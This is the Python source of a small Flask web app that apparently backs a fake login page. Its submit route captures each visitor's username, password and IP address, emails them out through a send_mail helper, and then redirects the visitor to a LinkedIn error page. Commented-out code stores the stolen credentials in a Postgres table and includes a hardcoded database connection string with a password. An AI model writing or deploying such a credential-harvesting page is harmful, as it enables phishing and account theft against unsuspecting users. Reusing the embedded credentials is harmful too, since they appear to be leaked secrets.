from flask import Flask, render_template, request, session, redirect
from flask_sqlalchemy import SQLAlchemy
import smtplib
import psycopg2
from send_email import send_mail
from flask import jsonify

app = Flask(__name__)




# ENV = "prod"

# if ENV == "dev":
#     app.debug = True
#     app.config["SQLALCHEMY_DATABASE_URI"] = "postgresql://postgres:admin@localhost/website"
# else:
#     app.debug = False
#     app.config["SQLALCHEMY_DATABASE_URI"] = "postgres://iksjfgfygndpvy:23ada2e525f9a12e4b7b7599f91f896f27681b076d00e3178922748ae4b8243c@ec2-107-20-104-234.compute-1.amazonaws.com:5432/ddp2mpufhvpk79"

# app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

# db = SQLAlchemy(app)

# class Feedback(db.Model):
#     __tablename__ = "feedback"
#     id = db.Column(db.Integer, primary_key = True)
#     username = db.Column(db.Text())
#     password = db.Column(db.String(200), unique = True)
#     ip_address = db.Column(db.Text())

#     def __init__(self, username, password, ip_address):
#         self.username = username
#         self.password = password
#         self.ip_address = ip_address




# usernames = []
# passwords = []
# ip_every = []

# totals = f"The details are: {usernames} \n {passwords}\n and the ip is {ip_every}"



@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    if request.method =="POST":
        #ip_address = jsonify({'ip': request.remote_addr}), 200
        ip_address = (request.remote_addr)
        username = request.form["username"]
        password = request.form["password"]
        # usernames.append(username)
        # passwords.append(password)
        # ip_every.append(ip_address)
        send_mail(username,password,ip_address)
        # #while db.session.query(Feedback).filter(Feedback.username == username).count() == True:
        # if db.session.query(Feedback).filter(Feedback.password == password).count() == 0:
        #     data = Feedback(username, password, ip_address)
        #     db.session.add(data)
        #     db.session.commit()
        #     send_mail(username,password,ip_address)
        #     return render_template("outdex.html")
        #return render_template("index.html")
        return redirect("https://www.linkedin.com/error404")
        



if __name__=="__main__":
    app.run()
